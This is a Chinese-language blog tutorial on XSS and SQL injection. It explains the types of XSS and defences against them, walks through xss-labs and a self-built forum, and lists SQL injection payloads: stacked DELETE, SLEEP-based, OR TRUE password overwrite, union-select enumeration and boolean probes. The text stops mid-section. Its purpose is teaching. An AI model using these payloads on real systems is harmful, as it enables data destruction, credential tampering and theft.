<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>xss攻击 SQL注入 - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="xss攻击 SQL注入" />
<meta property="og:description" content="xss攻击 1.简介 XSS中文叫做跨站脚本攻击（Cross-site scripting），本名应该缩写为CSS。
如何判断有没有xss注入 我在数据交互的地方输入什么内容，则我输入的内容被实际展示出来，这样我们才认为没有被XSS注入。
XSS漏洞是什么？ 是指攻击者利用Web服务器在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。
xss漏洞形成的原因： 主要是因为web应用程序在接收用户输入时没有充分的过滤和验证。
注意：当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。
XSS漏洞的危害 （1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。
（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。
（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。
（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。
2. xss类型 反射型XSS 当我们访问一个网站时，如果攻击者在该网站上设置一个恶意链接，此时当我们点击链接时，就会向攻击者服务器发送请求、返回对应的脚本，此时当浏览器加载脚本文件时，就会出现token或者cookie等信息泄露。
存储型XSS 存储型XSS（ Stored xss Attacks），也是持久型XSS，比反射型XSS更具有威胁性。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中）。
攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了
恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行
常见注入点
论坛、博客、留言板、网站的留言、评论、日志等交互处。
DOM型 DOM（document object model文档对象模型），客户端脚本处理逻辑导致的安全问题。
基于DOM的XSS漏洞是指受害者端的网页脚本在修改本地页面DOM环境时未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。
&lt;html&gt; &lt;head&gt; &lt;title&gt;DOM Based XSS Demo&lt;/title&gt; &lt;script&gt; function xsstest() { var str = document.getElementById(&#34;input&#34;).value; document.getElementById(&#34;output&#34;).innerHTML = &#34;&lt;img src=&#39;&#34;&#43;str&#43;&#34;&#39;&gt;&lt;/img&gt;&#34;; } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&#34;output&#34;&gt;&lt;/div&gt; &lt;input type=&#34;text&#34; id=&#34;input&#34; size=50 value=&#34;&#34; /&gt; &lt;input type=&#34;button&#34; value=&#34;submit&#34; onclick=&#34;xsstest()&#34; /&gt; &lt;/body&gt; &lt;/html&gt; 在这段代码中，submit按钮的onclick事件调用了xsstest()函数。而在xsstest()中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，造成了DOM Based XSS。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/ee2b0161a2b05f39fbe58d7c24e4d799/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-06-19T08:38:41+08:00" />
<meta property="article:modified_time" content="2023-06-19T08:38:41+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">xss攻击 SQL注入</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="xss_2"></a>xss攻击</h2> 
<h3><a id="1_3"></a>1.简介</h3> 
<p>XSS中文叫做跨站脚本攻击（Cross-site scripting），本名应该缩写为CSS。</p> 
<h4><a id="xss_5"></a>如何判断有没有xss注入</h4> 
<p>我在数据交互的地方输入什么内容，则我输入的内容被实际展示出来，这样我们才认为没有被XSS注入。</p> 
<h4><a id="XSS_7"></a>XSS漏洞是什么？</h4> 
<p>是指攻击者利用Web服务器在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。<br> <img src="https://images2.imgbox.com/06/ce/XBsHGryy_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="xss_10"></a>xss漏洞形成的原因：</h4> 
<p>主要是因为web应用程序在接收用户输入时没有充分的过滤和验证。<br> <strong>注意</strong>：当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。</p> 
<h4><a id="XSS_13"></a>XSS漏洞的危害</h4> 
<p>（1）<strong>窃取管理员帐号或Cookie</strong>。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。<br> （2）<strong>窃取用户的个人信息或者登录帐号</strong>，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。<br> （3）<strong>网站挂马</strong>。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。<br> （4）<strong>发送广告或者垃圾信息</strong>。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</p> 
<h3><a id="2_xss_19"></a>2. xss类型</h3> 
<h4><a id="XSS_20"></a>反射型XSS</h4> 
<p>当我们访问一个网站时，如果攻击者在该网站上设置一个恶意链接，此时当我们点击链接时，就会向攻击者服务器发送请求、返回对应的脚本，此时当浏览器加载脚本文件时，就会出现token或者cookie等信息泄露。<br> <img src="https://images2.imgbox.com/be/25/R2yQ3wpV_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="XSS_24"></a>存储型XSS</h4> 
<p>存储型XSS（ Stored xss Attacks），也是持久型XSS，比反射型XSS更具有威胁性。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中）。<br> <img src="https://images2.imgbox.com/87/77/IU2fXGRl_o.png" alt="在这里插入图片描述"></p> 
<p>攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了<br> 恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行</p> 
<p>常见注入点<br> 论坛、博客、留言板、网站的留言、评论、日志等交互处。</p> 
<h4><a id="DOM_33"></a>DOM型</h4> 
<p>DOM（document object model文档对象模型），客户端脚本处理逻辑导致的安全问题。<br> 基于DOM的XSS漏洞是指受害者端的网页脚本在修改本地页面DOM环境时未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用。</p> 
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>DOM Based XSS Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">function</span> <span class="token function">xsstest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">var</span> str <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> "<span class="token operator">&lt;</span>img
        src<span class="token operator">=</span><span class="token string">'"+str+"'</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>img<span class="token operator">&gt;</span>"<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>output<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>50</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">xsstest</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>

</code></pre> 
<p>在这段代码中，submit按钮的onclick事件调用了xsstest()函数。而在xsstest()中，修改了页面的DOM节点，通过innerHTML把一段用户数据当作HTML写入到页面中，造成了DOM Based XSS。<br> <strong>判断是哪一种XSS</strong><br> 发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。</p> 
<h3><a id="3XSS_61"></a>3.XSS发现与防护</h3> 
<ul><li>过滤一些危险字符，以及转义&amp; &lt; &gt; " ’ /等危险字符</li><li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此Cookie。</li><li>设置CSP(Content Security Policy)</li><li>输入内容长度</li></ul> 
<h3><a id="XSS_69"></a>XSS漏洞验证实例</h3> 
<h4><a id="1XSSXSSlabs_70"></a>1.反射型XSS漏洞常存在于参数中。本实验在XSS-labs第一关做验证。具体步骤如下：</h4> 
<p>（1）访问win2008R2SP1虚拟机上的xss-labs靶场，页面如下<br> <img src="https://images2.imgbox.com/d5/b2/rOenyczY_o.png" alt="在这里插入图片描述"></p> 
<p>（2）点击图片，进入xss-labs靶场的第一关，如下所示<br> <img src="https://images2.imgbox.com/2f/cd/8Wb2sTRC_o.png" alt="在这里插入图片描述"></p> 
<p>（3）我们将URL中的参数修改为?name=a回车，可以看到弹出以下页面，并将我们的内容显示在页面上。输入什么网页则返回什么，说明可能是一个XSS漏洞注入点。<br> <img src="https://images2.imgbox.com/0e/cb/DTUtIUVZ_o.png" alt="在这里插入图片描述"></p> 
<p>（4）我们将参数修改为?name=，测试是否触发弹窗。回车可以看到弹出窗口，说明网站后台未对输入参数进行过滤，存在xss漏洞。<br> <img src="https://images2.imgbox.com/63/05/SqWBXJIm_o.png" alt="在这里插入图片描述"><br> （5）我们右键网页，点击查看源码，如下。由于该网页没有对输入输出内容做任何的检验与过滤，导致这种异常的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p> 
<pre><code class="prism language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--STATUS OK--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html;charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
window<span class="token punctuation">.</span><span class="token function-variable function">alert</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  
<span class="token punctuation">{<!-- --></span>     
<span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level2.php?keyword=test"</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>欢迎来到level1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">border</span><span class="token punctuation">:</span>0px</span><span class="token punctuation">"</span></span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/x-scriptlet<span class="token punctuation">"</span></span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xss.tv/themes/default/templates/head.html<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>100%</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>50</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>欢迎来到level1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>欢迎用户<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alear</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>level1.png</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>center</span><span class="token punctuation">&gt;</span></span>payload的长度:29<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>

</code></pre> 
<h4><a id="2XSS_106"></a>2.存储型XSS漏洞验证实例</h4> 
<p>存储型XSS漏洞常存在于数据库内容中，如留言板等。此处利用之前搭建的论坛网站的留言功能作为实验平台，该平台的搭建过程参考 。具体过程如下：</p> 
<p>（1）我们登录访问上述网站，使用我们之前住过的账号a，密码1。登录后返回首页，点击“我要留言”。<br> <img src="https://images2.imgbox.com/6c/ce/2WGtAnhq_o.png" alt="在这里插入图片描述"></p> 
<p>（2）使用留言功能，留下如下的内容：。点击提交<br> <img src="https://images2.imgbox.com/03/7b/qydKEiti_o.png" alt="在这里插入图片描述"><br> （3）再次返回首页，可以看到刚刚留下的留言。<br> <img src="https://images2.imgbox.com/53/d4/PMOR1C9e_o.png" alt="在这里插入图片描述"><br> （4）点击该留言，出现弹窗，这就是存储型XSS漏洞。<br> <img src="https://images2.imgbox.com/28/56/3o2Ie7Gk_o.png" alt="在这里插入图片描述"><br> （5）右键该页面，查看网页源码，如下。我们看到因为我们搭建的平台没有对输入输出内容做任何的检验与过滤，导致这种异常的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p> 
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>留言论坛<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>留言内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">'</span>./index.php<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>返回首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span> <span class="token punctuation">/&gt;</span></span>
a:存储型xss<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>

</code></pre> 
<h2><a id="SQL_134"></a>SQL注入</h2> 
<h3><a id="1__SQL__135"></a>1. 什么是 SQL 注入</h3> 
<p>QL注入，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。</p> 
<p>SQL 注入一般发生在用户交互场景中，比如需要用户自已输入信息的输入框，或者下拉选择选项的这种，如果不做好输入内容的过滤，就很可能发生 SQL 注入。<br> <img src="https://images2.imgbox.com/4f/12/J9axQaLw_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="SQL_141"></a>SQL注入的原理</h4> 
<p>服务端没有过滤用户输入的恶意数据，直接把用户输入的数据当做SQL语句执行，从而影响数据库安全和平台安全。<br> （1）恶意拼接查询</p> 
<p>我们知道，SQL 语句可以查询、插入、更新和删除数据，且使用分号来分隔不同的命令。例如：</p> 
<pre><code class="prism language-html">SELECT * FROM users WHERE user_id = $user_id
</code></pre> 
<p>其中，user_id 是传入的参数，如果传入的参数值为“1234; DELETE FROM users”，那么最终的查询语句会变为：</p> 
<pre><code class="prism language-html">SELECT * FROM users WHERE user_id = 1234; DELETE FROM users
</code></pre> 
<p>如果以上语句执行，则会删除 users 表中的所有数据。<br> （2）利用注释执行非法命令。</p> 
<p>SQL 语句中可以插入注释。例如：</p> 
<pre><code class="prism language-html">SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version=$version
</code></pre> 
<p>如果 version 包含了恶意的字符串’-1’ OR 3 AND SLEEP(500)–，那么最终查询语句会变为：</p> 
<pre><code class="prism language-html">SELECT COUNT(*) AS 'num' FROM game_score WHERE game_id=24411 AND version='-1' OR 3 AND SLEEP(500)--
</code></pre> 
<p>以上恶意查询只是想耗尽系统资源，SLEEP(500) 将导致 SQL 语句一直运行。如果其中添加了修改、删除数据的恶意指令，那么将会造成更大的破坏。<br> （3）传入非法参数</p> 
<p>SQL 语句中传入的字符串参数是用单引号引起来的，如果字符串本身包含单引号而没有被处理，那么可能会篡改原本 SQL 语句的作用。 例如：</p> 
<pre><code class="prism language-html">SELECT * FROM user_name WHERE user_name = $user_name
</code></pre> 
<p>如果 user_name 传入参数值为 G’chen，那么最终的查询语句会变为：</p> 
<pre><code class="prism language-html">SELECT * FROM user_name WHERE user_name ='G'chen'
</code></pre> 
<p>一般情况下，以上语句会执行出错，这样的语句风险比较小。虽然没有语法错误，但可能会恶意产生 SQL 语句，并且以一种你不期望的方式运行。<br> （4）添加额外条件</p> 
<p>在 SQL 语句中添加一些额外条件，以此来改变执行行为。条件一般为真值表达式。例如：</p> 
<pre><code class="prism language-html">UPDATE users SET userpass='$userpass' WHERE user_id=$user_id;
</code></pre> 
<p>如果 user_id 被传入恶意的字符串“1234 OR TRUE”，那么最终的 SQL 语句会变为：</p> 
<pre><code class="prism language-html">UPDATE users SET userpass= '123456' WHERE user_id=1234 OR TRUE;
</code></pre> 
<p>这将更改所有用户的密码</p> 
<h4><a id="sql_203"></a>寻找sql注入(手工注入）</h4> 
<h5><a id="1_204"></a>1.找寻注入点</h5> 
<pre><code class="prism language-html">   1.url
   2. header
   3. 表单提交
</code></pre> 
<h5><a id="2_211"></a>2.判断是否存在注入</h5> 
<p>代码如下（示例）：</p> 
<pre><code class="prism language-html"> 4. and 1=1 
 5. and 1=2
 6. 使用运算符
 7. sleep


</code></pre> 
<h5><a id="3_222"></a>3.判断字段数</h5> 
<h5><a id="4_223"></a>4.查找显错位</h5> 
<p>联合查询</p> 
<pre><code class="prism language-html">union select 1,2,3 --mysql
union select null,null,null --mssql 对于字符类型要求严格可使用null代替所有类型
union all select null,null,null from dual --oracle 对于语法格式要求严格 dual 虚表

</code></pre> 
<h5><a id="5_232"></a>5.查询数据库名</h5> 
<pre><code class="prism language-html">database() --mysql
select * from V$version --oracle查询数据库的版本

</code></pre> 
<h5><a id="6_240"></a>6.查询表名</h5> 
<pre><code class="prism language-html">information_schema.tables --mysql
sysobjects --mssql
user_tables --oracle

</code></pre> 
<h5><a id="7_249"></a>7.查询字段名</h5> 
<pre><code class="prism language-html">information_schema.columns --mysql
syscolumns --mssql
user_tab_columns --oracle

</code></pre> 
<h5><a id="8_258"></a>8.查询值</h5> 
<h4><a id="_262"></a>布尔注入</h4> 
<p>Left判断</p> 
<pre><code class="prism language-c"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token char">' and left(database(),1)='</span>s' <span class="token operator">--</span><span class="token operator">+</span>

<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token char">' and left(database(),2) &gt; '</span>sa' <span class="token operator">--</span><span class="token operator">+</span>
</code></pre> 
<p>Like语句判断</p> 
<pre><code class="prism language-c"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>' <span class="token function">and</span> <span class="token punctuation">(</span>select table_name from information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>like <span class="token char">'e%'</span><span class="token operator">--</span><span class="token operator">+</span>
</code></pre> 
<p>Ascii语句判断</p> 
<pre><code class="prism language-c">and <span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>select table_name from information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">115</span><span class="token operator">--</span><span class="token operator">+</span>
</code></pre> 
<h4><a id="_283"></a>堆叠注入</h4> 
<pre><code class="prism language-c"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>' order by <span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>

<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">;</span>show tables<span class="token operator">%</span><span class="token number">23</span>

<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span>show columns from <span class="token number">1919810931114514</span><span class="token operator">%</span><span class="token number">23</span>

